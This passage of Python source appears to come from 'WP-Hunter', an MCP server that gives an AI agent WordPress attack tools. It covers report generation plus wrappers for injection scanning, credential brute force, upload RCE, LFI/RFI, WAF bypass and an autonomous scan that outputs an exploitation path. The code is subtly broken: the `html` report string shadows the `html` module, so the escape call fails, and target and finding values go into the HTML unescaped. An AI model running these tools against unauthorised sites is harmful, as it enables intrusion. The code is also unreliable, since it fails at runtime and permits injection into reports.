                    severity="High" if "nonce" in vuln.get("issue", "").lower() else "Critical",
                    confidence="Confirmed",
                    vulnerability_type="CSRF",
                    proof_of_concept=vuln.get("endpoint"),
                    impact="Attacker can perform unauthorized actions on behalf of authenticated users",
                    remediation="Implement WordPress nonce system. Use wp_nonce_field() in all forms.",
                    cvss_score=vuln.get("cvss", 7.5),
                    tags=["csrf", "authentication"]
                ))
        
        # 5. File Upload Testing
        upload_result = json.loads(await file_upload_vulnerability_tester(target))
        
        if upload_result.get("file_upload_issues_found", 0) > 0:
            for vuln in upload_result.get("vulnerabilities", []):
                findings_list.append(Finding(
                    id="upload-001",
                    title="File Upload Vulnerability",
                    severity="Critical",
                    confidence="Probable",
                    vulnerability_type="File Upload / RCE",
                    proof_of_concept=vuln.get("endpoint"),
                    impact="Attacker can upload malicious files and achieve Remote Code Execution",
                    remediation="Validate file types. Restrict file extensions. Store uploads outside webroot.",
                    cvss_score=9.8,
                    tags=["file-upload", "rce"]
                ))
        
        # 6. LFI Scanning
        lfi_result = json.loads(await path_traversal_lfi_scanner(target))
        
        if lfi_result.get("lfi_vulnerabilities_found", 0) > 0:
            for vuln in lfi_result.get("vulnerabilities", []):
                findings_list.append(Finding(
                    id="lfi-001",
                    title=f"{vuln.get('type')} Vulnerability",
                    severity="Critical",
                    confidence="Confirmed",
                    vulnerability_type=vuln.get("type"),
                    proof_of_concept=vuln.get("payload"),
                    impact="Attacker can read sensitive files and potentially execute code",
                    remediation="Sanitize user input. Use whitelist validation. Disable PHP wrappers.",
                    cvss_score=vuln.get("cvss", 9.5),
                    tags=["lfi", "path-traversal"]
                ))
        
        # 7. Plugin Vulnerability Check
        plugin_result = json.loads(await plugin_vulnerability_checker(target))
        
        if plugin_result.get("vulnerable_plugins_found", 0) > 0:
            for vuln in plugin_result.get("vulnerabilities", []):
                findings_list.append(Finding(
                    id="plugin-vuln",
                    title=f"Vulnerable Plugin: {vuln.get('plugin_name')}",
                    severity=vuln.get("severity", "High"),
                    confidence="Confirmed",
                    vulnerability_type=vuln.get("vulnerability_type"),
                    proof_of_concept=f"{vuln.get('plugin_name')} {vuln.get('installed_version')}",
                    impact=f"{vuln.get('cve')} affects this plugin version",
                    remediation=vuln.get("remediation"),
                    cvss_score=9.0 if "Critical" in vuln.get("severity", "") else 7.5,
                    tags=["plugin", "vulnerability", vuln.get("cve", "")]
                ))
        
        # Calculate metrics
        scan_duration = time.time() - start_time
        critical_count = len([f for f in findings_list if f.severity == "Critical"])
        high_count = len([f for f in findings_list if f.severity == "High"])
        medium_count = len([f for f in findings_list if f.severity == "Medium"])
        low_count = len([f for f in findings_list if f.severity == "Low"])
        
        # Risk score calculation
        risk_score = (critical_count * 25) + (high_count * 15) + (medium_count * 5) + (low_count * 1)
        risk_score = min(100, risk_score)
        
        # Generate recommendations
        recommendations = [
            "Update WordPress core to the latest version immediately.",
            "Keep all plugins and themes updated to latest versions.",
            "Implement a Web Application Firewall (WAF) like Wordfence or Cloudflare.",
            "Enable two-factor authentication for all WordPress users.",
            "Use strong, unique passwords and change default usernames.",
            "Remove unnecessary plugins and themes.",
            "Disable XML-RPC if not needed.",
            "Disable user enumeration via REST API.",
            "Implement proper logging and monitoring.",
            "Regular security audits and penetration tests.",
        ]
        
        report = PenetrationTestReport(
            target=target,
            scan_duration_seconds=scan_duration,
            findings=findings_list,
            summary=f"Found {len(findings_list)} vulnerabilities ({critical_count} Critical, {high_count} High, {medium_count} Medium, {low_count} Low)",
            risk_score=risk_score,
            vulnerability_count={
                "Critical": critical_count,
                "High": high_count,
                "Medium": medium_count,
                "Low": low_count
            },
            http_requests_made=http.request_count,
            recommendations=recommendations
        )
        
        return report.model_dump_json(indent=2)
    
    except Exception as e:
        return json.dumps({"error": f"Pentest report generation failed: {str(e)}"})


# ============================================================================
# TOOL 10: HTML REPORT GENERATOR
# ============================================================================
@mcp.tool()
async def generate_html_report(target: str) -> str:
    """
    Generate professional HTML penetration test report.
    
    Args:
        target: Target URL
    
    Returns:
        HTML report as string
    """
    try:
        # Get pentest report data
        report_json = await comprehensive_pentest_report(target)
        report_data = json.loads(report_json)
        
        if "error" in report_data:
            return json.dumps({"error": report_data["error"]})
        
        findings = report_data.get("findings", [])
        risk_score = report_data.get("risk_score", 0)
        summary = report_data.get("summary", "")
        
        # Determine risk level color
        if risk_score >= 75:
            risk_color = "#d32f2f"
            risk_level = "CRITICAL"
        elif risk_score >= 50:
            risk_color = "#f57c00"
            risk_level = "HIGH"
        elif risk_score >= 25:
            risk_color = "#fbc02d"
            risk_level = "MEDIUM"
        else:
            risk_color = "#388e3c"
            risk_level = "LOW"
        
        # Generate HTML
        html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WordPress Penetration Test Report - {target}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            line-height: 1.6;
        }}
        
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            box-shadow: 0 0 30px rgba(0,0,0,0.3);
        }}
        
        .header {{
            text-align: center;
            margin-bottom: 40px;
            border-bottom: 3px solid #667eea;
            padding-bottom: 20px;
        }}
        
        .header h1 {{
            font-size: 2.5em;
            color: #667eea;
            margin-bottom: 10px;
        }}
        
        .header p {{
            font-size: 1.1em;
            color: #666;
        }}
        
        .risk-score {{
            display: inline-block;
            width: 150px;
            height: 150px;
            border-radius: 50%;
            background: {risk_color};
            color: white;
            font-size: 3em;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px auto;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }}
        
        .risk-label {{
            text-align: center;
            font-size: 1.5em;
            color: #333;
            margin-top: 10px;
        }}
        
        .summary {{
            background: #f5f5f5;
            padding: 20px;
            border-left: 5px solid #667eea;
            margin: 20px 0;
            border-radius: 4px;
        }}
        
        .findings {{
            margin-top: 30px;
        }}
        
        .finding {{
            background: white;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 5px solid #ccc;
        }}
        
        .finding.critical {{
            border-left-color: #d32f2f;
            background: #ffebee;
        }}
        
        .finding.high {{
            border-left-color: #f57c00;
            background: #fff3e0;
        }}
        
        .finding.medium {{
            border-left-color: #fbc02d;
            background: #fffde7;
        }}
        
        .finding.low {{
            border-left-color: #388e3c;
            background: #f1f8e9;
        }}
        
        .finding-title {{
            font-size: 1.3em;
            font-weight: bold;
            margin-bottom: 10px;
            color: #333;
        }}
        
        .finding-meta {{
            display: flex;
            gap: 20px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }}
        
        .badge {{
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: bold;
        }}
        
        .badge.critical {{
            background: #d32f2f;
            color: white;
        }}
        
        .badge.high {{
            background: #f57c00;
            color: white;
        }}
        
        .badge.medium {{
            background: #fbc02d;
            color: #333;
        }}
        
        .badge.low {{
            background: #388e3c;
            color: white;
        }}
        
        .poc {{
            background: #f5f5f5;
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            overflow-x: auto;
            margin: 10px 0;
            border-left: 3px solid #667eea;
        }}
        
        .remediation {{
            background: #f1f8e9;
            padding: 10px;
            border-radius: 4px;
            margin-top: 10px;
            border-left: 3px solid #388e3c;
        }}
        
        .footer {{
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 3px solid #667eea;
            color: #666;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>WordPress Security Audit Report</h1>
            <p>Target: <strong>{target}</strong></p>
            <p>Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        </div>
        
        <div style="text-align: center;">
            <div class="risk-score">{int(risk_score)}</div>
            <div class="risk-label">Risk Score: {risk_level}</div>
        </div>
        
        <div class="summary">
            <h3>Executive Summary</h3>
            <p><strong>{summary}</strong></p>
            <p style="margin-top: 10px;">This comprehensive penetration test identified multiple security vulnerabilities that require immediate attention. The findings range from critical issues that could lead to complete system compromise to lower-priority items for hardening.</p>
        </div>
        
        <div class="findings">
            <h2>Detailed Findings</h2>
"""
        
        for i, finding in enumerate(findings, 1):
            severity_lower = finding.get("severity", "Low").lower()
            html += f"""
            <div class="finding {severity_lower}">
                <div class="finding-title">{i}. {finding.get("title", "Unknown Finding")}</div>
                <div class="finding-meta">
                    <span class="badge {severity_lower}">{finding.get("severity", "Unknown")}</span>
                    <span class="badge">{finding.get("vulnerability_type", "Unknown")}</span>
                    <span class="badge">CVSS: {finding.get("cvss_score", 0)}</span>
                </div>
                
                <h4>Impact</h4>
                <p>{finding.get("impact", "N/A")}</p>
                
                <h4>Proof of Concept</h4>
                <div class="poc">{html.escape(str(finding.get("proof_of_concept", "N/A")))}</div>
                
                <h4>Remediation</h4>
                <div class="remediation">{finding.get("remediation", "N/A")}</div>
            </div>
"""
        
        html += """
        </div>
        
        <div class="footer">
            <p><strong>WP-Hunter Professional v2.0</strong> | Enterprise WordPress Penetration Testing</p>
            <p>This report is confidential and intended only for authorized use.</p>
        </div>
    </div>
</body>
</html>
"""
        
        return json.dumps({
            "html_report": html,
            "total_findings": len(findings),
            "risk_score": risk_score,
            "timestamp": datetime.now().isoformat()
        }, indent=2)
    
    except Exception as e:
        return json.dumps({"error": f"HTML report generation failed: {str(e)}"})


# ============================================================================
# TOOL 11: XML-RPC SECURITY SCANNER
# ============================================================================
@mcp.tool()
async def xmlrpc_security_analyzer(target: str) -> str:
    """
    Comprehensive XML-RPC security analysis.
    Detects dangerous methods, brute force capabilities, and pingback SSRF.
    
    Args:
        target: Target URL
    
    Returns:
        JSON with XML-RPC attack surface assessment
    """
    return await xmlrpc_security_scan(target)


# ============================================================================
# TOOL 12: WORDPRESS SECURITY AUDIT
# ============================================================================
@mcp.tool()
async def wordpress_security_hardening_audit(target: str) -> str:
    """
    Complete WordPress security audit covering headers, hardening, and SSL/TLS.
    
    Args:
        target: Target URL
    
    Returns:
        JSON with security scores and hardening recommendations
    """
    return await wordpress_security_audit(target)


# ============================================================================
# TOOL 13: FULL RECONNAISSANCE SCAN
# ============================================================================
@mcp.tool()
async def reconnaissance_scan(target: str) -> str:
    """
    Complete reconnaissance scan - subdomains, tech fingerprint, endpoints, wayback.
    
    Args:
        target: Target domain or URL
        
    Returns:
        JSON with complete recon data including subdomains, technologies, and endpoints
    """
    return await full_reconnaissance_scan(target)


# ============================================================================
# TOOL 14: FULL INJECTION SCAN
# ============================================================================
@mcp.tool()
async def injection_scan(target: str, parameters: str = "") -> str:
    """
    Complete injection vulnerability scan (SQLi, XSS, Command, SSTI).
    
    Args:
        target: Target URL
        parameters: Comma-separated list of parameters to test (optional)
        
    Returns:
        JSON with all injection findings including POCs
    """
    params = [p.strip() for p in parameters.split(",")] if parameters else None
    return await full_injection_scan(target, params)


# ============================================================================
# TOOL 15: FULL AUTHENTICATION AUDIT
# ============================================================================
@mcp.tool()
async def authentication_scan(target: str, username: str = "admin") -> str:
    """
    Complete authentication security audit (JWT, brute force, session, 2FA).
    
    Args:
        target: Target URL
        username: Username to test against
        
    Returns:
        JSON with authentication findings including weak credentials
    """
    return await full_authentication_audit(target, username)


# ============================================================================
# TOOL 16: FULL FILE ATTACK SCAN
# ============================================================================
@mcp.tool()
async def file_attack_scan(target: str, parameter: str = "file") -> str:
    """
    Complete file attack scan (upload RCE, LFI, RFI, path traversal).
    
    Args:
        target: Target URL
        parameter: File parameter name to test
        
    Returns:
        JSON with file attack findings including RCE verification
    """
    return await full_file_attack_scan(target, parameter)


# ============================================================================
# TOOL 17: WAF BYPASS ASSESSMENT
# ============================================================================
@mcp.tool()
async def waf_bypass_scan(target: str, vuln_type: str = "all") -> str:
    """
    Complete WAF bypass assessment for all vulnerability types.
    
    Args:
        target: Target URL
        vuln_type: Type to test (sqli, xss, lfi, all)
        
    Returns:
        JSON with WAF detection and bypass results
    """
    return await full_waf_bypass_assessment(target, vuln_type)


# ============================================================================
# TOOL 18: AUTONOMOUS BUG BOUNTY SCANNER
# ============================================================================
@mcp.tool()
async def autonomous_scan(target: str, aggressive: bool = False) -> str:
    """
    Fully autonomous bug bounty scan - AI-driven vulnerability discovery.
    Intelligently chains all tools and generates exploitation roadmap.
    
    Args:
        target: Target URL or domain
        aggressive: Enable aggressive scanning mode
        
    Returns:
        JSON with complete scan results, findings chain, and exploitation path
    """
    return await autonomous_bug_bounty_scan(target, aggressive)


# ============================================================================
# TOOL 19: GENERATE BUG BOUNTY REPORT
# ============================================================================
@mcp.tool()
async def generate_report(scan_results_json: str, format: str = "html") -> str:
    """
    Generate professional bug bounty report from scan results.
    Creates HTML/Markdown reports with CVSS scores and remediation.
    
    Args:
        scan_results_json: JSON string of scan results from autonomous_scan
        format: Report format - html, markdown, or json
        
    Returns:
        JSON containing the generated report
    """
    return await generate_bug_bounty_report(scan_results_json, format)


# ============================================================================
# TOOL 20: CALCULATE CVSS SCORE
# ============================================================================
@mcp.tool()
async def cvss_calculator(vulnerability_type: str, exploitation_confirmed: bool = False) -> str:
    """
    Calculate CVSS v3.1 score for vulnerability type.
    
    Args:
        vulnerability_type: Type of vulnerability (SQL Injection, XSS, File Upload RCE, etc.)
        exploitation_confirmed: Whether exploitation was confirmed
        
    Returns:
        JSON with CVSS score, severity, and vector string
    """
    return await calculate_cvss_score(vulnerability_type, exploitation_confirmed)


# ============================================================================
# MAIN ENTRY POINT
# ============================================================================
def main():
    """Entry point for CLI"""
    mcp.run(transport='stdio')


if __name__ == "__main__":
    main()
